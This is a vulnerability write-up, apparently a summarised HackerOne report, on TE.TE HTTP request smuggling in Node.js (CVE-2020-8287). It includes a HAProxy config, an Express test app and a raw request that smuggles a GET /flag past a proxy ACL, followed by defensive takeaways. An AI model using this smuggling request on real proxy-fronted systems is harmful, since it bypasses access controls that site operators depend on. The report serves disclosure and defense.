# HTTP Request Smuggling via Duplicate Transfer-Encoding Headers in Node.js

## Metadata
- **Source:** HackerOne
- **Report:** 1002188 | https://hackerone.com/reports/1002188
- **Submitted:** 2020-10-08
- **Reporter:** piao
- **Program:** Node.js
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** HTTP Request Smuggling, CL.TE (Content-Length Transfer-Encoding), TE.TE (Transfer-Encoding Transfer-Encoding), Header Parsing Ambiguity
- **CVEs:** CVE-2020-8287
- **Category:** uncategorised

## Summary
Node.js allows duplicate Transfer-Encoding headers in HTTP requests, processing only the first one while subsequent headers are ignored. This inconsistency between Node.js and intermediary proxies (like HAProxy) enables HTTP request smuggling attacks where malicious requests bypass access controls and security policies. An attacker can craft a request with conflicting Transfer-Encoding headers to desynchronize request interpretation between proxy and backend server.

## Attack scenario
1. Attacker identifies that HAProxy enforces access restrictions on /flag endpoint
2. Attacker crafts HTTP POST request with duplicate Transfer-Encoding headers where first is valid (chunked) and second is invalid (chunked-false)
3. HAProxy processes the invalid second header differently than Node.js backend, creating request boundary confusion
4. HAProxy interprets the request boundary one way (blocking access to /flag)
5. Node.js backend interprets the same request differently, treating the second Transfer-Encoding header as invalid and using the first
6. Attacker smuggles a second GET request for /flag within the POST body, which Node.js processes as a separate request that bypasses the proxy's ACL rules

## Root cause
Node.js HTTP parser accepts and processes only the first occurrence of the Transfer-Encoding header while silently ignoring subsequent duplicate headers. This differs from how some proxies handle duplicate headers, creating an interpretation gap. The lack of strict header validation and duplicate header rejection allows malicious actors to craft requests that are parsed differently by intermediary and backend systems.

## Attacker mindset
An attacker would recognize that proxy and backend server behavior diverges on duplicate header handling. By exploiting this discrepancy, they can craft polyglot requests that satisfy the proxy's security policies while smuggling malicious requests to the backend. This enables bypassing WAF rules, access controls, and security policies without detection.

## Defensive takeaways
- Implement strict HTTP header validation that rejects requests with duplicate Transfer-Encoding or Content-Length headers
- Normalize header parsing to align with RFC 7230 which discourages duplicate hop-by-hop headers
- Configure proxies and backends to use identical HTTP parsing logic and reject ambiguous requests
- Implement request smuggling detection at the proxy layer by rejecting requests with conflicting TE/CL headers
- Use HTTP/2 or HTTP/3 exclusively where possible as they have stricter header validation
- Log and alert on requests containing multiple Transfer-Encoding headers as potential attack attempts
- Perform end-to-end request validation rather than relying on individual header values

## Variant hunting
Search for similar header parsing inconsistencies in: Content-Length header duplication handling, other hop-by-hop headers (Connection, Proxy-Connection), header normalization routines, accept-encoding/content-encoding parsing, custom header value extraction that doesn't validate for duplicates, any system processing HTTP headers from untrusted sources without strict validation.

## MITRE ATT&CK
- T1190
- T1552
- T1562

## Notes
This vulnerability requires a specific setup with both a restrictive proxy and a Node.js backend to demonstrate impact. The actual risk depends on the security policies enforced at the proxy layer and what sensitive resources could be accessed via smuggling. Modern versions of Node.js may have patched this, but the fundamental issue of duplicate header handling should be verified. The vulnerability demonstrates the importance of defense-in-depth and consistent HTTP parsing across infrastructure components.

## Full report
<details><summary>Expand</summary>

**Summary:** 
Potential HTTP Request Smuggling exists in nodejs. Attacker can use two same header field make TE-TE HTTP Request Smuggling attack.

**Description:** 
nodejs allow same header field in a http request. for example, we can send two `Transfer-Encoding` header field, even if one of them is false header field. But nodejs only identify the first header field and ignore the after. This lead to a Potential HTTP Request Smuggling.

## Steps To Reproduce:
for example, using haproxy to make TE-TE attack:

haproxy 1.5.3 version haproxy.cfg
haproxy.cfg forbid access `/flag` URI
```
global
 daemon
 maxconn 256

defaults
 mode http
 timeout connect 5000ms
 timeout client 50000ms
 timeout server 50000ms

frontend http-in
 bind *:80
 default_backend servers
 acl url_403 path_beg -i /flag
 http-request deny if url_403

backend servers
 server server1 127.0.0.1:8080 maxconn 32
```

app.js
```
var express = require('express');
var app = express();
var bodyParser = require('body-parser')

app.use(bodyParser())

app.get('/', function (req, res) {
    res.send('Hello World!');
});

app.get('/flag', function (req, res) {
    res.send('flag is 1a2b3c4d5e6f');
});

app.post('/', function (req, res) {
    res.send('Hello World!');
});

app.listen(8080, function () {
    console.log('Example app listening on port 8080!');
});
```

use this http request can bypass haproxy `/flag` restrict
```
POST / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked
Transfer-Encoding: chunked-false

1
A
0

GET /flag HTTP/1.1
Host: 127.0.0.1
foo: x


```

## Impact: 
It is possible to smuggle the request and disrupt the user experience.

## Supporting Material/References:
N/A

## Impact

It is possible to smuggle the request and disrupt the user experience.

</details>

---
*Analysed by Claude on 2026-05-24*
